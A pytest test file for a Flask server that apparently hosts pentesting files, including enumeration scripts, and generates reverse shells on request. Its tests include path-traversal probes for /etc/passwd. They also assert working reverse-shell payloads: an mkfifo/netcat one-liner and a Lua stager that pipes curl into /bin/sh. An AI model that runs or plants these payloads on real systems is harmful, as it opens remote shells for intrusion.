import pytest
from toolbox.server import server
from pathlib import Path
from flask import Flask
from http import HTTPStatus
import tempfile


@pytest.fixture
def client():
    app = Flask(__name__, static_folder=None)
    test_harness = Path(__file__).parent / "harnesses" / "simple"
    app.config["ROOT_SERVE_DIRECTORY"] = test_harness / "serve"
    app.config["ROOT_DIRECTORY"] = test_harness
    app.config["CONFIG_PATH"] = test_harness / "config.json"
    app.register_blueprint(server.server)

    # app.run(port=8000)
    with app.test_client() as client:
        yield client


# Open the given response in a browser to inspect the rendered html
def open_response(response):
    import subprocess
    import time

    with tempfile.NamedTemporaryFile(suffix=".html") as tmp:
        tmp.write(response.data)
        tmp.flush()
        subprocess.run(["open", tmp.name])
        time.sleep(1)


def test_index_served_files(client):
    response = client.get("/")
    assert response.status_code == HTTPStatus.OK

    expected_served_files = [
        b'<li><a href="/folder">folder</a></li>',
        b'<li><a href="/simple.txt">simple.txt</a></li>',
    ]

    for link in expected_served_files:
        assert link in response.data


def test_index_custom_files(client):
    response = client.get("/")
    assert response.status_code == HTTPStatus.OK

    expected_custom_files = [
        b'<li><a href="/enum_linux.sh">enum_linux.sh</a></li>',
        b'<li><a href="/enum_windows.exe">enum_windows.exe</a></li>',
        b'<li><a href="/my_custom_namespace">my_custom_namespace</a></li>',
    ]

    for link in expected_custom_files:
        assert link in response.data


def test_index_shells(client):
    response = client.get("/")
    assert response.status_code == HTTPStatus.OK

    expected_custom_files = [
        b'<li><a href="/shells/shell.js">/shells/shell.js</a>',
        b'<li><a href="/shells/shell.js/4444">/shells/shell.js/4445</a>',
        b'<li><a href="/shells/shell.js/127.0.0.1/4444">/shells/shell.js/127.0.0.1/4444</a>',
    ]

    for link in expected_custom_files:
        assert link in response.data


@pytest.mark.parametrize(
    "path,expected_data",
    [
        ("/simple.txt", b"simple.txt content\n"),
        ("/folder/child.txt", b"child.txt content\n"),
        ("/folder/nested_folder/nested_child.txt", b"nested_child.txt content\n"),
    ],
)
def test_reading_served_files(client, path, expected_data):
    response = client.get(path)
    assert response.status_code == HTTPStatus.OK
    assert response.data == expected_data


@pytest.mark.parametrize(
    "path,expected_links",
    [
        (
            "/folder",
            [
                b'<a href="/folder/child.txt">child.txt</a>',
                b'<a href="/folder/nested_folder">nested_folder</a>',
            ],
        ),
        (
            "/folder/nested_folder",
            [b'<a href="/folder/nested_folder/nested_child.txt">nested_child.txt</a>'],
        ),
    ],
)
def test_viewing_server_folders(client, path, expected_links):
    response = client.get(path)
    assert response.status_code == HTTPStatus.OK
    for link in expected_links:
        assert link in response.data


@pytest.mark.parametrize(
    "path,expected_data",
    [
        ("/enum_linux.sh", b"enum.sh content\n"),
        ("/enum_windows.exe", b"enum.exe content\n"),
    ],
)
def test_reading_custom_files(client, path, expected_data):
    response = client.get(path)
    assert response.status_code == HTTPStatus.OK
    assert response.data == expected_data


@pytest.mark.parametrize(
    "path,expected_data",
    [
        ("/my_custom_namespace/linux/enum.sh", b"enum.sh content\n"),
        ("/my_custom_namespace/windows/enum.exe", b"enum.exe content\n"),
    ],
)
def test_reading_custom_files_with_namespace(client, path, expected_data):
    response = client.get(path)
    assert response.status_code == HTTPStatus.OK
    assert response.data == expected_data


@pytest.mark.parametrize(
    "path,expected_links",
    [
        (
            "/my_custom_namespace",
            [
                b'<li><a href="/my_custom_namespace/linux">linux</a></li>',
                b'<li><a href="/my_custom_namespace/windows">windows</a></li>',
            ],
        ),
        (
            "/my_custom_namespace/",
            [
                b'<li><a href="/my_custom_namespace/linux">linux</a></li>',
                b'<li><a href="/my_custom_namespace/windows">windows</a></li>',
            ],
        ),
        (
            "/my_custom_namespace/linux",
            [b'<li><a href="/my_custom_namespace/linux/enum.sh">enum.sh</a></li>'],
        ),
        (
            "/my_custom_namespace/windows",
            [b'<a href="/my_custom_namespace/windows/enum.exe">enum.exe</a>'],
        ),
    ],
)
def test_exploring_custom_files_with_namespace(client, path, expected_links):
    response = client.get(path)
    assert response.status_code == HTTPStatus.OK
    for link in expected_links:
        assert link in response.data


@pytest.mark.parametrize(
    "path",
    [
        ("/missing.sh"),
        ("/foo/missing.sh"),
        ("/foo/bar/missing.sh"),
        ("/foo/bar/missing.sh"),
    ],
)
def test_requesting_missing_files(client, path):
    response = client.get(path)
    assert response.status_code == HTTPStatus.NOT_FOUND
    assert b"The requested URL was not found on the server" in response.data


@pytest.mark.parametrize(
    "path",
    [
        ("//etc/passwd"),
        ("/../../../../../../../../../../../../../../../../../../etc/passwd"),
        ("/folder//etc/passwd"),
        ("/my_custom_namespace//etc/passwd"),
        (
            "/my_custom_namespace//../../../../../../../../../../../../../../../../../../etc/passwd"
        ),
        ("/my_custom_namespace/../local_file_inclusion_test.txt"),
    ],
)
def test_security_against_local_file_inclusion(client, path):
    response = client.get(path)
    assert response.status_code == HTTPStatus.NOT_FOUND
    assert b"The requested URL was not found on the server" in response.data


@pytest.mark.parametrize(
    "path,expected",
    [
        (
            "/shells/shell.sh",
            b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f",
        ),
        (
            "/shells/shell.sh/5555",
            b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 5555 >/tmp/f",
        ),
        (
            "/shells/shell.sh/10.10.10.10/1234",
            b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f",
        ),
    ],
)
def test_shell_sh(client, path, expected):
    response = client.get(path)
    assert response.data == expected


@pytest.mark.parametrize(
    "path,expected",
    [
        (
            "/shells/shell.lua",
            b'os.execute("/usr/bin/curl http://localhost/shells/shell.sh | /bin/sh")',
        ),
        # Note: The lua payload is a stager, and lhost/lport values have no impact
        (
            "/shells/shell.lua/5555",
            b'os.execute("/usr/bin/curl http://localhost/shells/shell.sh | /bin/sh")',
        ),
        (
            "/shells/shell.lua/10.10.10.10/1234",
            b'os.execute("/usr/bin/curl http://localhost/shells/shell.sh | /bin/sh")',
        ),
    ],
)
def test_shell_lua(client, path, expected):
    response = client.get(path)
    assert response.data == expected